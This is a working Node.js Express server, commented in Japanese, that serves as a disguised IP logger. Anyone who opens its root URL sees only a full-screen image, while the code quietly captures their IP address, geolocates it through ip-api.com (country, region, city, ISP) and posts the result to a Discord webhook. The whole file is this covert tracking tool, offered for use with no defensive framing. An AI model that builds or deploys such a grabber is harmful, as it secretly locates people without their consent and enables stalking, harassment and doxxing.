const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Discord Webhook (Renderの環境変数から取得)
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

app.set('trust proxy', true);

// 1. ブラウザが画像ファイル(background.jpg)を直接読み込めるようにする設定
app.get('/background.jpg', (req, res) => {
    res.sendFile(path.join(__dirname, 'background.jpg'));
});

app.get('/', async (req, res) => {
    let rawIp = req.headers['x-forwarded-for'] || req.ip || '';
    let ip = rawIp.split(',')[0].trim();

    try {
        // IP情報を取得
        const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
        const geoData = await geoResponse.json();

        // Discordへのメッセージ組み立て
        let discordMessage = `🚨 **新しいアクセスを検知しました！**\nIPアドレス: \`${ip}\`\n`;
        
        if (geoData.status === 'success') {
            discordMessage += `国: ${geoData.country}\n地域: ${geoData.regionName}\n都市: ${geoData.city}\nプロバイダ: ${geoData.isp}`;
        } else {
            discordMessage += `位置情報の取得に失敗しました: ${geoData.message}`;
        }

        // Discordへ送信 (裏側で実行)
        if (DISCORD_WEBHOOK_URL) {
            fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: discordMessage })
            }).catch(err => console.error('Discord送信エラー:', err));
        }

        // 2. ブラウザには「画面にピッタリ収まる画像」を表示するHTMLを返す
        const html = `
        <!DOCTYPE html>
        <html lang="ja">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Image</title>
            <style>
                body {
                    margin: 0;
                    padding: 0;
                    background-color: #000; /* 余白を黒にする */
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh; /* 画面の高さいっぱいに */
                    overflow: hidden; /* スクロールバーを消す */
                }
                img {
                    max-width: 100%;
                    max-height: 100%;
                    object-fit: contain; /* ★ここが重要：アスペクト比を保ったまま画面に収める */
                }
            </style>
        </head>
        <body>
            <img src="/background.jpg" alt="Background">
        </body>
        </html>
        `;

        res.send(html);

    } catch (error) {
        console.error('❌ エラーが発生しました:', error.message);
        res.status(500).send('サーバーエラー');
    }
});

app.listen(PORT, () => {
    console.log(`サーバーが起動しました: http://localhost:${PORT}`);
});
